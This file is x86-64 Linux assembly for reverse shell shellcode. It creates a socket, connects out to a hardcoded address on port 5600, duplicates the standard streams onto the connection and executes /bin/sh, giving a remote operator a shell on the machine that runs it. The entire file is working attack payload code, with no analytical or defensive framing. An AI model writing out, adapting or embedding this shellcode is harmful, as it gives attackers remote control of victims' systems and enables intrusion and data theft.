;Linux/x86-64 Reverse Shell Shellcode
;Originally by Manuel Mancera, modified 5/29/2018

bits 64

section .text
        global _start
 
_start:
        mov rax, 0xc0a83201        	        ; IP Address (make sure it's big endian)
        push rax                                ;
        push word 0xe015                        ; Port (5600)
        push word 2                             ; Address family -AF_INET (0x2)
 
        mov rdi, 2                                 ; family
        mov rsi, 1                                 ; type
        xor rdx, rdx                            ; protocol
        mov rax, 41                                 ; socket syscall
        syscall
 
        mov rdi, rax                            ; sockfd
        mov rdx, 16                                 ; length
        mov rax, 42                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall
        
        xor rsi, rsi
        
dup_loop:
        mov rax, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle dup_loop

sh_execve:        
        xor rax, rax
        xor rsi, rsi
        mov rdi, 0x68732f6e69622f2f 		;bin/sh
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59                      ;execve
        syscall